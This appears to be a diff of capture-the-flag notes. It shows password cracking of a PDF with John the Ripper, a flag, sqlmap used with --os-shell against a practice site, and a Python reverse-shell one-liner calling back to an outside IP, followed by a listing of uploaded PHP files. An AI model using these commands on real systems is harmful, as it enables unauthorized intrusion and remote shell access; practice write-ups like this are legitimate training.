@@ -1,6 +1,7 @@
 MISC
 
 ## Finding the password to a protected pdf:
+```
 git clone https://github.com/magnumripper/JohnTheRipper.git
 cd ./JohnTheRipper/src
 ./configure && make
@@ -28,8 +29,10 @@ Session completed
 
 
 {siht_dnif_uoy_did_woh}
+```
 
 http://bb.threatsims.com/
+```
 sqlmap -u http://bb.threatsims.com/index.php --forms --os-shell
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("165.227.195.68",5656));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -51,3 +54,4 @@ tmpbpphn.php    tmpuahbn.php  tmpundjg.php  tmpuspml.php  tmpuzwvj.php
 tmpbqvka.php    tmpucgam.php  tmpundrf.php  tmpuswwg.php  tmpuzxin.php
 tmpbqwyk.php    tmpucuih.php  tmpungtb.php  tmputruu.php  tmpuzxpz.php
 tmpbsvzo.php    tmpucxvf.php  tmpunjdl.php  tmpuuehm.php
+```
